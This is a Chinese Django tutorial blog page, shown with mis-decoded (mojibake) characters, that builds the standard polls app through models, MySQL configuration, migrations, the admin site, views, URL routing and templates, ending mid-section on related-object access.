<p><code>Django</code>çš„MTVæ¨¡å‹å’ŒMVCæœ¬è´¨ä¸Šæ˜¯ç›¸åŒçš„, MTV æ˜¯ MVC çš„ä¸€ç§ç»†åŒ–, å°†åŸæ¥ MVC ä¸­çš„ V å±‚æ‹¿å‡ºæ¥è¿›è¡Œåˆ†ç¦», è§†å›¾çš„æ˜¾ç¤ºä¸å¦‚ä½•æ˜¾ç¤ºäº¤ç»™ Template å±‚, è€Œ View å±‚æ›´ä¸“æ³¨äºå®ç°ä¸šåŠ¡é€»è¾‘.<br>å…¶å®åœ¨ Django æ˜¯æœ‰ Controller å±‚çš„, åªä¸è¿‡å®ƒç”±æ¡†æ¶æœ¬èº«æ¥å®ç°, æ‰€ä»¥æˆ‘ä»¬ä¸ç”¨å…³å¿ƒå®ƒ.<br>Django æ›´å…³æ³¨äºMã€T å’Œ V</p>
</blockquote>
<h2 id="åˆ›å»ºåº”ç”¨"><a href="#åˆ›å»ºåº”ç”¨" class="headerlink" title="åˆ›å»ºåº”ç”¨"></a>åˆ›å»ºåº”ç”¨</h2><p>åœ¨é¡¹ç›®ç›®å½•ä¸‹è¿è¡Œ, åˆ›å»ºä¸€ä¸ªæŠ•ç¥¨åº”ç”¨.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python manage.py startapp polls</span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºçš„åº”ç”¨æ‰æ˜¯å¤„ç†è¯·æ±‚å’Œç¼–å†™ä¸šåŠ¡é€»è¾‘çš„åœ°æ–¹.</p>
<h3 id="ç›®å½•ç»“æ„-1"><a href="#ç›®å½•ç»“æ„-1" class="headerlink" title="ç›®å½•ç»“æ„"></a>ç›®å½•ç»“æ„</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">polls/</span><br><span class="line">    __init__.<span class="keyword">py</span></span><br><span class="line">    admin.<span class="keyword">py</span></span><br><span class="line">    apps.<span class="keyword">py</span></span><br><span class="line">    migrations/</span><br><span class="line">        __init__.<span class="keyword">py</span></span><br><span class="line">    models.<span class="keyword">py</span></span><br><span class="line">    tests.<span class="keyword">py</span></span><br><span class="line">    views.<span class="keyword">py</span></span><br></pre></td></tr></table></figure>

<h2 id="æ¨¡å‹å±‚"><a href="#æ¨¡å‹å±‚" class="headerlink" title="æ¨¡å‹å±‚"></a>æ¨¡å‹å±‚</h2><h3 id="æ•°æ®åº“é…ç½®"><a href="#æ•°æ®åº“é…ç½®" class="headerlink" title="æ•°æ®åº“é…ç½®"></a>æ•°æ®åº“é…ç½®</h3><p>ä¿®æ”¹<code>settings.py</code>ä¸­çš„<code>DATABASES</code>, é»˜è®¤æ˜¯ä½¿ç”¨<code>SQLite</code>, è¿™é‡Œå°†å®ƒæ”¹æˆ<code>MySQL</code>.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">DATABASES = &#123;</span><br><span class="line">    <span class="string">&#x27;default&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;ENGINE&#x27;</span>: <span class="string">&#x27;django.db.backends.mysql&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;NAME&#x27;</span>: <span class="string">&#x27;polls&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;USER&#x27;</span>: <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PASSWORD&#x27;</span>: <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;HOST&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PORT&#x27;</span>: <span class="string">&#x27;3306&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Django</code>ä½¿ç”¨çš„æ˜¯<code>mysqlclient</code>, è¿™é‡Œå°†å…¶æ”¹æˆç†Ÿæ‚‰çš„<code>pymysql</code>, ä¿®æ”¹<code>mysite\__init__.py</code>, æ·»åŠ ä»¥ä¸‹ä»£ç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">pymysql.install_as_MySQLdb()</span><br></pre></td></tr></table></figure>

<p>ç„¶ååˆå§‹åŒ–æ•°æ®åº“, ç”Ÿæˆåˆå§‹çš„ç®¡ç†è¡¨.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python manage.py migrate</span><br></pre></td></tr></table></figure>

<blockquote>
<p>è¿™é‡Œéœ€è¦æ³¨æ„ä¸€ä¸ªç‚¹, Djangoå¹¶ä¸ä¼šè‡ªåŠ¨å¸®æˆ‘ä»¬å»ºåº“, å¦‚æœç›´æ¥è¿è¡Œçš„è¯, ä¼šæŠ¥é”™:<code>django.db.utils.OperationalError: (1049, &quot;Unknown database &#39;polls&#39;&quot;)</code>, è¡¨ç¤ºæ²¡æœ‰<code>polls</code>è¿™ä¸ªæ•°æ®åº“</p>
</blockquote>
<p>è¿™é‡Œæ‰‹åŠ¨å»ºä¸‹åº“, æ³¨æ„ä¸‹<strong>å­—ç¬¦é›†</strong>å’Œ<strong>æ’åºè§„åˆ™</strong>.</p>
<img data-src="http://img.owq.world/2022/03/1611-713a00.png" style="zoom:80%;" />

<p>å»ºå¥½åçš„è¡¨æ˜¯è¿™æ ·å­çš„.</p>
<img data-src="http://img.owq.world/2022/03/1619-5b9089.png" style="zoom:67%;" />

<h3 id="åˆ›å»ºæ¨¡å‹"><a href="#åˆ›å»ºæ¨¡å‹" class="headerlink" title="åˆ›å»ºæ¨¡å‹"></a>åˆ›å»ºæ¨¡å‹</h3><h4 id="æ·»åŠ åº”ç”¨"><a href="#æ·»åŠ åº”ç”¨" class="headerlink" title="æ·»åŠ åº”ç”¨"></a>æ·»åŠ åº”ç”¨</h4><p>ä¿®æ”¹<code>polls/models.py</code>, æ·»åŠ æŠ•ç¥¨åº”ç”¨, è¿™é‡Œåˆ›å»º<code>Question</code>ã€<code>Choice</code>ä¸¤ä¸ªæ¨¡å‹.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Question</span>(models.Model):</span><br><span class="line">    question_text = models.CharField(max_length=<span class="number">200</span>)	<span class="comment"># é—®é¢˜æè¿°</span></span><br><span class="line">    pub_date = models.DateTimeField(<span class="string">&#x27;date published&#x27;</span>)	<span class="comment"># å‘å¸ƒæ—¶é—´</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Choice</span>(models.Model):</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># è¡¨ç¤ºæ¯ä¸ªChoiceå¯¹è±¡éƒ½å…³è”åˆ°ä¸€ä¸ªQuestionå¯¹è±¡</span></span><br><span class="line">    question = models.ForeignKey(Question, on_delete=models.CASCADE)</span><br><span class="line"></span><br><span class="line">    choice_text = models.CharField(max_length=<span class="number">200</span>)	<span class="comment"># é€‰é¡¹æè¿°</span></span><br><span class="line">    votes = models.IntegerField(default=<span class="number">0</span>)	<span class="comment"># å½“å‰å¾—ç¥¨æ•°</span></span><br></pre></td></tr></table></figure>

<h4 id="æ¿€æ´»æ¨¡å‹"><a href="#æ¿€æ´»æ¨¡å‹" class="headerlink" title="æ¿€æ´»æ¨¡å‹"></a>æ¿€æ´»æ¨¡å‹</h4><ul>
<li><p>ä¿®æ”¹<code>settings.py</code>, æ¿€æ´»APP</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">INSTALLED_APPS = [</span><br><span class="line">    <span class="string">&#x27;polls.apps.PollsConfig&#x27;</span>,	<span class="comment"># åˆ›å»ºpollss</span></span><br><span class="line">    <span class="string">&#x27;django.contrib.admin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.auth&#x27;</span>,</span><br><span class="line">	...</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
</li>
<li><p>åŒæ­¥æœ¬åœ°æ¨¡å‹ä¿®æ”¹<br>ä¼šåœ¨<code>polls/migrations</code>ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªè¿ç§»æ–‡ä»¶(æ“ä½œç±»ä¼¼git commit).</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python manage.py makemigrations polls</span><br></pre></td></tr></table></figure>
</li>
<li><p>æ­£å¼è¿›è¡Œæ•°æ®åº“åŒæ­¥(åœ¨æ•°æ®åº“åˆ›å»ºç›¸åº”çš„è¡¨)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python manage.py migrate</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨ <code>python manage.py sqlmigrate</code> å¯ä»¥æŸ¥çœ‹æ‰§è¡Œçš„SQL.</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python</span> manage.<span class="keyword">py</span> sqlmigrate polls <span class="number">0001</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ—¶å€™æŸ¥çœ‹æ•°æ®åº“æ‰å¯ä»¥çœ‹åˆ°åˆ›å»ºçš„è¡¨.</p>
<img data-src="http://img.owq.world/2022/03/1707-60768e.png" style="zoom:67%;" /></li>
</ul>
<h3 id="ç®¡ç†åå°"><a href="#ç®¡ç†åå°" class="headerlink" title="ç®¡ç†åå°"></a>ç®¡ç†åå°</h3><ul>
<li><p>å®‰è£…ä¾èµ–åŒ…, ç”¨äºå¯†ç åŠ å¯†å¤„ç†</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install cryptography</span><br></pre></td></tr></table></figure>
</li>
<li><p>åˆ›å»ºç®¡ç†å‘˜è´¦å·</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python</span> manage.<span class="keyword">py</span> createsuperuser</span><br></pre></td></tr></table></figure>
</li>
<li><p>ä¿®æ”¹<code>polls/admin.py</code>, å‘ç®¡ç†é¡µé¢åŠ å…¥æŠ•ç¥¨åº”ç”¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Question</span><br><span class="line"></span><br><span class="line">admin.site.register(Question)</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>æµ‹è¯•ä¸€ä¸‹</strong></p>
<blockquote>
<p>å¦‚æœä½ ä¹‹å‰æ²¡æœ‰å…³é—­<code>Django</code>çš„è¯, ä¼šå‘ç°å·²ç»çƒ­æ›´æ–°ä»£ç äº†.</p>
</blockquote>
<p>è¿™æ—¶æµè§ˆå™¨è¾“å…¥<span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4ODg4L2FkbWluJUU4JUJGJTlCJUU1JTg1JUE1JUU3JUFFJUExJUU3JTkwJTg2JUU1JTkwJThFJUU1JThGJUIw">http://127.0.0.1:8888/adminè¿›å…¥ç®¡ç†åå°</span>.</p>
<p><img data-src="http://img.owq.world/2022/03/1524-562a9a.png"></p>
<p>ç™»å½•åèƒ½çœ‹åˆ°å·²ç»æ·»åŠ çš„æŠ•ç¥¨åº”ç”¨æ¥å£.</p>
<p><img data-src="http://img.owq.world/2022/03/1525-d3fb89.png"></p>
<p>åœ¨è¿™é‡Œè¿›è¡Œæ·»åŠ ä¸‹é—®é¢˜.</p>
<p><img data-src="http://img.owq.world/2022/03/1529-c70549.png"></p>
<p>æ·»åŠ å®Œåå‰å¾€æ•°æ®åº“çœ‹çœ‹,æ˜¯ä¸æ˜¯æ–°å¢äº†åˆšåˆšçš„é—®é¢˜å‘¢.</p>
<img data-src="http://img.owq.world/2022/03/1530-4df650.png" style="zoom:67%;" />

<p>è¿™å¾—ç›ŠäºORM, è¿™éƒ¨åˆ†å’Œæ•°æ®åº“äº¤äº’çš„æ“ä½œä¸ç”¨æˆ‘ä»¬æ‰‹åŠ¨å®ç°.<br>å¯¹äºä¸ªäººå¼€å‘è€…æ¥è¯´, å¾ˆæ˜¯æ–¹ä¾¿, ä½†å¯¹äºå¦‚ä»Šå‰åç«¯åˆ†ç¦»çš„å¤§ç¯å¢ƒä¸‹,å¯èƒ½å¹¶æ²¡æœ‰é‚£ä¹ˆç»™åŠ›, å½“ç„¶, è¿™æ˜¯åè¯äº†.</p>
<h2 id="ä½¿ç”¨API"><a href="#ä½¿ç”¨API" class="headerlink" title="ä½¿ç”¨API"></a>ä½¿ç”¨API</h2><blockquote>
<p>è¿™é‡Œä½¿ç”¨äº¤äº’å¼å‘½ä»¤è¡Œæ¥æ„Ÿå—ä¸‹<code>Django</code>é‡Œçš„ä¸€äº›å†…ç½®API</p>
</blockquote>
<p>ç»ˆç«¯è¿è¡Œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python manage.py shell</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å¯¼å…¥é¡¹ç›®ä¸‹çš„åŒ…</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; from polls.models import Question</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; q = Question(question_text=<span class="string">&quot;What&#x27;s new?&quot;</span>, pub_date=timezone.now())</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">è°ƒç”¨æ–¹æ³•å­˜åˆ°æ•°æ®åº“é‡Œ</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; q.save()</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æŸ¥çœ‹ç›®å‰å¯¹è±¡çš„<span class="built_in">id</span></span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; q.id</span></span><br><span class="line">2</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æŸ¥çœ‹è¿™ä¸ªæ¨¡å‹æ•°æ®åº“ä¸­çš„å¯¹è±¡</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; Question.objects.all()</span></span><br><span class="line">&lt;QuerySet [&lt;Question: Question object (1)&gt;, &lt;Question: Question object (2)&gt;]&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¾“å‡ºçš„æ˜¯ç±»çš„ä¿¡æ¯, è¿™æ ·æ²¡æ³•ç¬¬ä¸€çœ¼å°±çŸ¥é“æ˜¯ä»€ä¹ˆ, è¿™é‡Œä¸ºç±»æ·»åŠ <code>__str__</code>æ–¹æ³•æ¥å¤„ç†è¿™ä¸ªé—®é¢˜.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Question</span>(models.Model):</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.question_text</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Choice</span>(models.Model):</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.choice_text</span><br></pre></td></tr></table></figure>

<p>è¿›å…¥äº¤äº’å‘½ä»¤è¡Œæµ‹è¯•.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; from polls.models import Question</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; Question.objects.all()</span></span><br><span class="line">&lt;QuerySet [&lt;Question: åƒå•¥äº†?&gt;, &lt;Question: What&#x27;s new?&gt;]&gt;</span><br></pre></td></tr></table></figure>

<p>å…¶å®ƒAPIæ“ä½œä¹Ÿå¯ä»¥ç”¨ç›¸åŒæ–¹å¼è¿›è¡Œè°ƒç”¨.</p>
<h2 id="è§†å›¾å±‚"><a href="#è§†å›¾å±‚" class="headerlink" title="è§†å›¾å±‚"></a>è§†å›¾å±‚</h2><blockquote>
<p>ä¸Šé¢å®Œæˆäº†Model(æ¨¡å‹å±‚)çš„domeçº§å­¦ä¹ , æ¥ä¸‹æ¥è¿›è¡ŒView(è§†å›¾å±‚)çš„å­¦ä¹ .</p>
</blockquote>
<h3 id="å¯è¿”å›æ•°æ®ç±»å‹"><a href="#å¯è¿”å›æ•°æ®ç±»å‹" class="headerlink" title="å¯è¿”å›æ•°æ®ç±»å‹"></a>å¯è¿”å›æ•°æ®ç±»å‹</h3><ul>
<li>æ–‡æœ¬</li>
<li>æ–‡ä»¶<ul>
<li>html</li>
<li>css</li>
<li>js</li>
<li>è§†é¢‘æ–‡ä»¶, éŸ³é¢‘æ–‡ä»¶</li>
</ul>
</li>
<li>JSONæ•°æ®æ ¼å¼</li>
</ul>
<h3 id="åˆ›å»ºè§†å›¾"><a href="#åˆ›å»ºè§†å›¾" class="headerlink" title="åˆ›å»ºè§†å›¾"></a>åˆ›å»ºè§†å›¾</h3><ul>
<li><p><code>polls/views.py</code>è§†å›¾æ˜¯å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚çš„åœ°æ–¹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&quot;Hello, world. You&#x27;re at the polls index.&quot;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>ä½¿ç”¨è·¯ç”±è§£å†³ä¸åŒè¯·æ±‚è°ƒç”¨ä¸åŒçš„å¤„ç†æ–¹æ³•</p>
<ul>
<li><p>ä¿®æ”¹<code>polls/urls.py</code>, æ¥åˆ›å»ºåº”ç”¨çš„è·¯å¾„ç®¡ç†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;&#x27;</span>, views.index, name=<span class="string">&#x27;index&#x27;</span>),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
</li>
<li><p>ä¿®æ”¹<code>mysite/urls.py</code>, å°†åº”ç”¨çš„è·¯å¾„ç®¡ç†æ·»åŠ åˆ°å…¨å±€é…ç½®å½“ä¸­</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> include, path</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;polls/&#x27;</span>, include(<span class="string">&#x27;polls.urls&#x27;</span>)),</span><br><span class="line">    path(<span class="string">&#x27;admin/&#x27;</span>, admin.site.urls),</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<p>æµ‹è¯•è®¿é—® <span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4ODg4L3BvbGxz">http://127.0.0.1:8888/polls</span> ä¼šæ˜¾ç¤ºä»€ä¹ˆå§.</p>
<h3 id="æ·»åŠ è§†å›¾"><a href="#æ·»åŠ è§†å›¾" class="headerlink" title="æ·»åŠ è§†å›¾"></a>æ·»åŠ è§†å›¾</h3><p>ä¿®æ”¹<code>polls/views.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Question</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹index, ä½¿å…¶å±•ç¤ºé—®é¢˜</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    latest_question_list = Question.objects.order_by(<span class="string">&#x27;-pub_date&#x27;</span>)[:<span class="number">5</span>]</span><br><span class="line">    output = <span class="string">&#x27;, &#x27;</span>.join([q.question_text <span class="keyword">for</span> q <span class="keyword">in</span> latest_question_list])</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">detail</span>(<span class="params">request, question_id</span>):</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&quot;You&#x27;re looking at question %s.&quot;</span> % question_id)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">results</span>(<span class="params">request, question_id</span>):</span><br><span class="line">    response = <span class="string">&quot;You&#x27;re looking at the results of question %s.&quot;</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(response % question_id)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vote</span>(<span class="params">request, question_id</span>):</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&quot;You&#x27;re voting on question %s.&quot;</span> % question_id)</span><br></pre></td></tr></table></figure>

<h3 id="æ·»åŠ è·¯ç”±"><a href="#æ·»åŠ è·¯ç”±" class="headerlink" title="æ·»åŠ è·¯ç”±"></a>æ·»åŠ è·¯ç”±</h3><p>å…ˆäº†è§£ä¸‹é…ç½®è§„åˆ™</p>
<ul>
<li><p>URLåŒ¹é…</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">path</span><span class="params">(<span class="string">&#x27;&lt;int:question_id&gt;/&#x27;</span>, views.detail, name=<span class="string">&#x27;detail&#x27;</span>)</span></span>,</span><br></pre></td></tr></table></figure>

<ul>
<li>intè¡¨ç¤ºç±»å‹</li>
<li><code>question_id</code>è¡¨ç¤ºä¼ é€’çš„å‚æ•°å</li>
</ul>
</li>
<li><p>URLé…ç½®(mysite&#x2F;settings.py)</p>
<ul>
<li><p><code>ROOT_URLCONF</code></p>
<p>è®¾ç½®ä¸»URLé…ç½®æ–‡ä»¶.</p>
</li>
</ul>
</li>
</ul>
<p>æŠŠè¿™äº›æ–°è§†å›¾æ·»åŠ è¿› <code>polls.urls</code> æ¨¡å—é‡Œ, åªè¦æ·»åŠ å‡ ä¸ª <a href="https://docs.djangoproject.com/zh-hans/3.2/ref/urls/#django.conf.urls.url"><code>url()</code></a> å‡½æ•°è°ƒç”¨å°±è¡Œ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®å‘½åç©ºé—´</span></span><br><span class="line">app_name = <span class="string">&#x27;polls&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯, URLåŒ¹é…æ˜¯æŒ‰ç…§é¡ºåºè¿›è¡Œçš„.</span></span><br><span class="line">urlpatterns = [</span><br><span class="line">    <span class="comment"># ex: /polls/</span></span><br><span class="line">    path(<span class="string">&#x27;&#x27;</span>, views.index, name=<span class="string">&#x27;index&#x27;</span>),</span><br><span class="line">    <span class="comment"># ex: /polls/5/</span></span><br><span class="line">    path(<span class="string">&#x27;&lt;int:question_id&gt;/&#x27;</span>, views.detail, name=<span class="string">&#x27;detail&#x27;</span>),</span><br><span class="line">    <span class="comment"># ex: /polls/5/results/</span></span><br><span class="line">    path(<span class="string">&#x27;&lt;int:question_id&gt;/results/&#x27;</span>, views.results, name=<span class="string">&#x27;results&#x27;</span>),</span><br><span class="line">    <span class="comment"># ex: /polls/5/vote/</span></span><br><span class="line">    path(<span class="string">&#x27;&lt;int:question_id&gt;/vote/&#x27;</span>, views.vote, name=<span class="string">&#x27;vote&#x27;</span>),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p><strong>æµ‹è¯•ä¸€ä¸‹</strong></p>
<p><img data-src="http://img.owq.world/2022/03/1111-d7b801.png"></p>
<h2 id="æ¨¡æ¿å±‚"><a href="#æ¨¡æ¿å±‚" class="headerlink" title="æ¨¡æ¿å±‚"></a>æ¨¡æ¿å±‚</h2><blockquote>
<p>ä¸€ä¸ªæ­£å¸¸çš„ç½‘ç«™ä¸ä¼šåªæœ‰æ–‡å­—, è¿˜éœ€è¦æœ‰ç›¸åº”çš„UIç•Œé¢, è¿™æ—¶å€™æ¨¡æ¿å°±ä¸Šçº¿äº†. </p>
</blockquote>
<h3 id="åˆ›å»ºæ¨¡æ¿"><a href="#åˆ›å»ºæ¨¡æ¿" class="headerlink" title="åˆ›å»ºæ¨¡æ¿"></a>åˆ›å»ºæ¨¡æ¿</h3><p>é¦–å…ˆ, åœ¨<code>polls</code>ç›®å½•é‡Œåˆ›å»ºä¸€ä¸ª<code>templates</code>ç›®å½•, Django å°†ä¼šåœ¨è¿™ä¸ªç›®å½•é‡ŒæŸ¥æ‰¾æ¨¡æ¿æ–‡ä»¶, ç„¶ååœ¨åˆ›å»º<code>polls</code>(å¯¹äºç›¸åº”çš„åº”ç”¨), ä¸ºäº†ä¸é€ æˆå‘½åç©ºé—´æ±¡æŸ“.</p>
<p>å®Œæ•´è·¯å¾„åº”è¯¥æ˜¯<code>polls/templates/polls/index.html</code>,æ·»åŠ å†…å®¹,ç”Ÿæˆä¸€ä¸ªé—®é¢˜åˆ—è¡¨,ç„¶åæ ¹æ®ç›¸åº”é—®é¢˜idè·³è½¬åˆ°è¯¦æƒ…é¡µ.</p>
<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> latest_question_list %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-tag">&#123;% <span class="name"><span class="name">for</span></span> question <span class="keyword">in</span> latest_question_list %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/polls/</span></span></span><span class="template-variable">&#123;&#123; question.id &#125;&#125;</span><span class="language-xml"><span class="tag"><span class="string">/&quot;</span>&gt;</span></span><span class="template-variable">&#123;&#123; question.question_text &#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    </span><span class="template-tag">&#123;% <span class="name"><span class="name">endfor</span></span> %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;% <span class="name"><span class="name">else</span></span> %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>No polls are available.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span></span><br></pre></td></tr></table></figure>

<p>åˆ›å»º<code>polls/templates/polls/detail.html</code>, æ·»åŠ å†…å®¹, æ‰“å°å½“å‰é—®é¢˜å†…å®¹åˆ—è¡¨.</p>
<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><span class="template-variable">&#123;&#123; question.question_text &#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;% <span class="name"><span class="name">for</span></span> choice <span class="keyword">in</span> question.choice_set.all %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><span class="template-variable">&#123;&#123; choice.choice_text &#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;% <span class="name"><span class="name">endfor</span></span> %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><strong>å…³è”å¯¹è±¡API</strong> --- <code>_set</code></p>
<blockquote>
